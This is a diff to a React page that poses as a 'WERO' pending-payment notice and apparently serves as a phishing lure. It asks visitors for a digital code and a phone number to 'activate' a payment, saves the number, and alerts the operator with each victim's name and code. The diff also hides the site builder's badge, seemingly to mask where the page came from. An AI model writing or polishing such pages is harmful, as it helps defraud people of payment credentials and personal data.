@@ -1,5 +1,4 @@
-
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -15,9 +14,17 @@ const Index = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
 
+  // Masquer l'élément avec id="lovable-badge" dès le montage du composant
+  useEffect(() => {
+    const element = document.getElementById("lovable-badge");
+    if (element) {
+      element.style.display = "none";
+    }
+  }, []);
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!code || !telephone) {
       toast({
         title: "Erreur de validation",
@@ -26,17 +33,16 @@ const Index = () => {
       });
       return;
     }
-    
+
     setIsLoading(true);
-    
+
     try {
-      // Vérifier si le code existe
       const { data, error } = await supabase
         .from("sefon")
         .select("id, nom, prenom")
         .eq("code", code)
         .single();
-      
+
       if (error || !data) {
         toast({
           title: "Code invalide",
@@ -46,26 +52,19 @@ const Index = () => {
         setIsLoading(false);
         return;
       }
-      
-      // Mettre à jour le numéro de téléphone
-      await supabase
-        .from("sefon")
-        .update({ telephone })
-        .eq("id", data.id);
-      
-      // Stocker l'ID de l'utilisateur dans localStorage pour référence ultérieure
+
+      await supabase.from("sefon").update({ telephone }).eq("id", data.id);
+
       localStorage.setItem("userId", data.id);
-      
-      // Envoyer une notification à l'administrateur
-      const userName = `${data.prenom || ''} ${data.nom || ''}`.trim();
+
+      const userName = `${data.prenom || ""} ${data.nom || ""}`.trim();
       sendAdminNotification({
         subject: "Nouvelle connexion utilisateur WERO",
         message: `L'utilisateur ${userName} avec le code digital ${code} vient de se connecter.`,
         userCode: code,
-        userName: userName
+        userName: userName,
       });
-      
-      // Rediriger vers la page suivante
+
       navigate("/confirmation");
     } catch (error) {
       console.error(error);
@@ -84,14 +83,25 @@ const Index = () => {
       <header className="bg-yellow-300 p-4">
         <h1 className="text-2xl font-bold">WERO</h1>
       </header>
-      
+
       <main className="flex-grow flex justify-center items-center p-4">
         <div className="max-w-md w-full bg-white rounded-lg shadow-md p-6">
           <div className="text-center mb-8">
-            <h2 className="text-2xl font-bold mb-2">VOUS AVEZ REÇU UN PAIEMENT EN ATTENTE.</h2>
+            <h2 className="text-2xl font-bold mb-2">
+              VOUS AVEZ REÇU UN PAIEMENT EN ATTENTE.
+            </h2>
             <div className="flex justify-center mb-6">
               <div className="bg-green-500 rounded-full p-6 w-24 h-24 flex items-center justify-center">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" className="w-12 h-12">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="white"
+                  strokeWidth="3"
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  className="w-12 h-12"
+                >
                   <polyline points="20 6 9 17 4 12"></polyline>
                 </svg>
               </div>
@@ -101,7 +111,7 @@ const Index = () => {
               afin d'activer votre paiement.
             </p>
           </div>
-          
+
           <form onSubmit={handleSubmit} className="space-y-6">
             <div className="space-y-2">
               <label htmlFor="code" className="block text-sm font-medium">
@@ -116,7 +126,7 @@ const Index = () => {
                 required
               />
             </div>
-            
+
             <div className="space-y-2">
               <label htmlFor="telephone" className="block text-sm font-medium">
                 N° de téléphone*
@@ -130,7 +140,7 @@ const Index = () => {
                 required
               />
             </div>
-            
+
             <Button
               type="submit"
               className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-semibold py-3"
@@ -141,7 +151,7 @@ const Index = () => {
           </form>
         </div>
       </main>
-      
+
       <Footer />
     </div>
   );
